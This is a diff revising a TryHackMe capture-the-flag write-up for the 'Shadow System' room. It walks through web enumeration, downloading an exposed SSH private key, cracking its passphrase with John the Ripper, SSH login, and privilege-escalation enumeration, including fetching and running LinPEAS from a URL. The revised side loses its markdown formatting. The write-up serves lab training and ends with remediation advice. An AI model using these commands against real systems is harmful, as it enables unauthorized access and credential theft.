@@ -1,95 +1,158 @@
+
+Markdown
 # Shadow System — TryHackMe Write-Up
 
-**Room Name:** Shadow system  
+**Room Name:** Shadow System  
 **Difficulty:** Easy / Medium  
-**Objective:** Enumerate the exposed web service, locate and retrieve the private SSH key (`id_rsa`), crack the key passphrase offline, establish SSH access as `tom`, escalate privileges on the target host, and read both `user` and `root` flags.
+**Objective:** Enumerate the exposed web service, locate and retrieve the private SSH key (`id_rsa`), crack the key passphrase offline, establish SSH access as `tom`, escalate privileges on the target host, and read both the `user` and `root` flags.
 
 ## Overview
 
-`Shadow system` is a boot-to-root style challenge designed around structured enumeration, credential/key discovery, offline passphrase auditing, authenticated remote access, and local privilege escalation. Rather than relying on a single noisy exploit, the challenge rewards methodical reconnaissance and careful verification at every stage of the attack chain.
+`Shadow System` is a boot-to-root style challenge based on structured enumeration, credential and key discovery, offline passphrase auditing, SSH authentication, and local privilege escalation.
 
 ## 1. Reconnaissance & Web Enumeration
 
-### 1.1 Target Reachability and Initial Inspection
+### 1.1 Target Reachability
 
-Before launching deeper enumeration, verify network reachability to the target machine and check what services are responding on standard web ports.
+Verify network reachability and inspect the initial HTTP response:
 
+```bash
 ping -c 4 <TARGET_IP>
 curl -I http://<TARGET_IP>/
+curl http://<TARGET_IP>/
+Check the returned headers and landing page for server details, hidden links, or other useful information.
 
-Inspecting the initial HTTP response and landing page helps establish baseline context, server headers, and potential paths worth exploring with a directory wordlist.
+1.2 Directory and File Enumeration
+Search for hidden directories, backup files, configuration artifacts, and exposed key material:
 
-### 1.2 Directory and File Enumeration
-
-Run directory brute-forcing against the HTTP service to uncover hidden directories, backup files, configuration artifacts, or exposed key material.
-
+bash
 dirb http://<TARGET_IP>/
+You can also use Gobuster to cross-check the results:
 
-You can also use an alternative directory enumeration tool with a standard wordlist to cross-check hidden endpoints:
-
+bash
 gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40
+Manually inspect any interesting directories or files discovered during enumeration.
 
-### 1.3 Retrieving the Private Key (`id_rsa`)
+2. Private Key Discovery
+2.1 Retrieve the Private SSH Key
+If an exposed private key named id_rsa is discovered, download it to the attacking machine:
 
-Once enumeration identifies an exposed SSH private key (`id_rsa`) under a web path, download it locally and apply strict file permissions so SSH accepts the key without permission warnings.
-
+bash
 wget http://<TARGET_IP>/<PATH_TO_ID_RSA> -O id_rsa
+Apply secure permissions and verify the downloaded file:
+
+bash
 chmod 600 id_rsa
 file id_rsa
 head -n 5 id_rsa
+A valid private key should remain confidential and must not be shared or stored in a publicly accessible location.
 
-## 2. Offline Passphrase Cracking & Initial Access
+3. Passphrase Cracking & Initial Access
+3.1 Extract and Crack the Passphrase
+If the private key is encrypted, convert it into a format that John the Ripper can process:
 
-### 2.1 Extracting the Hash and Cracking with John the Ripper
+bash
+python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+On systems where ssh2john is available directly:
 
-If the `id_rsa` private key is protected by a passphrase, convert it into a format John the Ripper can process and run a wordlist attack against it.
-
+bash
 ssh2john id_rsa > id_rsa.hash
+Run a dictionary attack using the RockYou wordlist:
+
+bash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Display the recovered passphrase:
 
-After cracking completes, review the recovered passphrase cleanly:
-
+bash
 john --show id_rsa.hash
+If the RockYou wordlist is compressed, decompress it before use:
 
-### 2.2 SSH Authentication as `tom`
+bash
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+Perform passphrase cracking only against systems and keys you are authorized to test.
 
-Use the private key (`id_rsa`) along with the recovered passphrase to authenticate over SSH as user `tom`:
+3.2 SSH Authentication as tom
+Use the recovered passphrase and private key to authenticate:
 
+bash
 ssh -i id_rsa tom@<TARGET_IP>
+Perform basic system inspection after obtaining the shell:
 
-Once an interactive shell as `tom` is established, perform basic situational awareness and locate/read the user flag:
-
+bash
 id
 whoami
 hostname
 uname -a
 pwd
 ls -la
-cat user.txt
+Locate and read the user flag:
 
-## 3. Post-Exploitation & Privilege Escalation
+bash
+find /home -name "user.txt" -type f 2>/dev/null
+cat /home/tom/user.txt
+4. Privilege Escalation
+4.1 Local Enumeration
+Inspect the user's privileges and available escalation vectors:
 
-### 3.1 Local Enumeration for Privilege Escalation Vectors
-
-With shell access as `tom`, inspect local permissions, sudo rules, SUID/SGID binaries, scheduled tasks, and writable files/scripts that may allow escalating privileges to `root`.
-
+bash
 sudo -l
+id
+uname -a
+Search for SUID and SGID binaries:
+
+bash
 find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+Search for writable files and directories:
+
+bash
 find / -writable -type f 2>/dev/null
+find / -writable -type d 2>/dev/null
+Review scheduled tasks:
+
+bash
 cat /etc/crontab
 ls -la /etc/cron*
+crontab -l
+Inspect running processes:
+
+bash
 ps aux
+LinPEAS can also be used to perform a broader automated enumeration:
 
-### 3.2 Escalating to `root` and Reading the Root Flag
+bash
+wget <LINPEAS_URL> -O linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+Always review and validate the automated findings manually before attempting exploitation.
 
-Leverage the identified privilege escalation vector to obtain `root` privileges, confirm elevated identity, inspect `/root`, and read `root.txt`:
+4.2 Escalate to Root
+Use the identified privilege escalation vector to obtain a root shell.
 
+Confirm elevated privileges:
+
+bash
 id
+whoami
+Verify the root flag:
+
+bash
 ls -la /root
 cat /root/root.txt
-
-## 4. Key Takeaways & Remediation
-
-- Do Not Expose Sensitive Files in Web Roots: Private keys (`id_rsa`), backups, and configuration files should never be placed in publicly accessible web directories.
-- Enforce Strong Passphrases and Key Hygiene: Protected keys with strong passphrases and restricted `600` permissions reduce unauthorized reuse risk, while avoiding key exposure altogether prevents initial compromise.
-- Audit Sudo, SUID, and System Configurations: Regularly review `sudo -l`, SUID binaries, cron jobs, and file ownership to prevent unintended local privilege escalation paths.
+5. Key Takeaways & Remediation
+Never expose private keys, backups, credentials, or configuration files in publicly accessible web directories.
+Use strong passphrases and store SSH private keys with restricted permissions.
+Immediately revoke, rotate, and replace exposed SSH keys.
+Review sudo rules, SUID/SGID binaries, cron jobs, writable scripts, and file ownership regularly.
+Apply the principle of least privilege to users, services, and administrative access.
+Prevent sensitive files from being stored under web roots.
+Regularly perform local privilege escalation assessments to identify misconfigurations.
+6. Skills Practiced
+Web directory and file enumeration
+Sensitive data discovery
+SSH private key analysis
+Offline passphrase cracking
+SSH authentication
+Linux privilege enumeration
+Local privilege escalation
+Security remediation
